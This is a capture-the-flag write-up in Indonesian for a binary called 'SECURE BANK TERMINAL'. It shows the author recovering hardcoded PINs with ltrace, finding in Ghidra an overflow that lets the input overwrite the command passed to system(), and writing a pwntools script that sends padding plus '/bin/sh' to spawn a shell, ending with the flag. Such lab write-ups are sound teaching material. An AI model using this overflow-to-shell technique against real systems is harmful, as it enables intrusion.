# haha.md 

# analysis & exploit step by step

pertama aku akan coba exploit file binarynya, langkah identifikasi awal yaitu dengan melihat metadatanya 

<p align="center"> <img width="958" height="88" alt="image" src="https://github.com/user-attachments/assets/98db49b4-9197-4ee7-838a-a591b8887e09" /> </p>

arsitektur x86-64, dan not stripped . ini akan memudahkan debugging.

- menjalankan program
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(haha)
└> ./chall
=== SECURE BANK TERMINAL ===
Enter PIN: 1234567890
Invalid PIN. Access denied.
```
program meminta pin, aku coba gunakan ltrace untuk mencoba apakah program memiliki kerentanan pada fungsi validasinya

<p align= "center"> <img width="688" height="220" alt="image" src="https://github.com/user-attachments/assets/83a47108-033d-4e16-b9a4-db044b97a67f" /> </p>

ternyata program melakukan validasi dengan cara membandingkan input dengan 3 angka 4 digit. 

password valid : 
- 1234
- 0000
- 9999


aku akan memilih 1234  
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(haha)
└> ./chall
=== SECURE BANK TERMINAL ===
Enter PIN: 1234
PIN accepted. Welcome.
Enter destination account number: 123456789
Transferring funds to account: 123456789

VAULT UNLOCKED: $10,000,000 transferred successfully
```
sekarang program meminta account number. setelah aku cek menggunakan ltrace input ini tidak membandingkan input dengan apapun. 

jadi aku lanjutkan analisis dengan ghidra. fungsi yang mengurus bagian input account number adalah `open_vault`:
```C

void open_vault(void)

{
  char local_b8 [64];
  char local_78 [112];
  
  builtin_strncpy(local_78,"echo \'VAULT UNLOCKED: $10,000,000 transferred successfully\'",60);
  local_78[60] = '\0';
  local_78[61] = '\0';
  local_78[62] = '\0';
  local_78[63] = '\0';
  local_78[64] = '\0';
  local_78[65] = '\0';
  local_78[66] = '\0';
  local_78[67] = '\0';
  local_78[68] = '\0';
  local_78[69] = '\0';
  local_78[70] = '\0';
  local_78[71] = '\0';
  local_78[72] = '\0';
  local_78[73] = '\0';
  local_78[74] = '\0';
  local_78[75] = '\0';
  local_78[76] = '\0';
  local_78[77] = '\0';
  local_78[78] = '\0';
  local_78[79] = '\0';
  local_78[80] = '\0';
  local_78[81] = '\0';
  local_78[82] = '\0';
  local_78[83] = '\0';
  local_78[84] = '\0';
  local_78[85] = '\0';
  local_78[86] = '\0';
  local_78[87] = '\0';
  local_78[88] = '\0';
  local_78[89] = '\0';
  local_78[90] = '\0';
  local_78[91] = '\0';
  local_78[92] = '\0';
  local_78[93] = '\0';
  local_78[94] = '\0';
  local_78[95] = '\0';
  local_78[96] = '\0';
  local_78[97] = '\0';
  local_78[98] = '\0';
  local_78[99] = '\0';
  printf("Enter destination account number: ");
  fgets(local_b8,128,stdin);
  printf("Transferring funds to account: %s\n",local_b8);
  system(local_78);
  return;
}
```

dari sini terlihat jelas terdapat kerentanan buffer overflow dan berpotensi menimpa variabel local_78. dan variabel tersebut akan dieksekusi oleh system(). 

`char local_b8 [64];` variabel berukuran 64 byte sedangkan fungsi input fgetsnya menerima hingga 128 byte. maka 64 byte sisanya akan menimpa variabel di bawahnya : local_78

karena ukuran buffer hanya 64 byte, maka aku akan mengisi buffer itu dengan sampah lalu byte ke 65 nya aku isi dengan string /bin/sh. 

<p align="center"><img width="1393" height="439" alt="image" src="https://github.com/user-attachments/assets/ee2eb02c-9e72-478e-b437-f43dab7cd712" /></p>

yep ini work, dan agar lebih mudah saat menembak server nya aku menggunakan python :

```Python
from pwn import *

SERV : "server"
PORT : 1234

password = b"1234"
payload = b""   
padding = b"A"*64
payload += padding
payload += b"/bin/sh"

io = process("./chall")
io.sendlineafter(b"Enter PIN: ",password)
io.sendlineafter(b"number: ", payload)
io.sendline(b"pwd")
io.interactive()


```
<p align="center"><img width="1350" height="319" alt="image" src="https://github.com/user-attachments/assets/6bb06a80-a62f-4537-bda9-746db47ea073" /></p>

flag = `LKS{fef704d7d14172787d15b71b8b9b2dcc}`
`
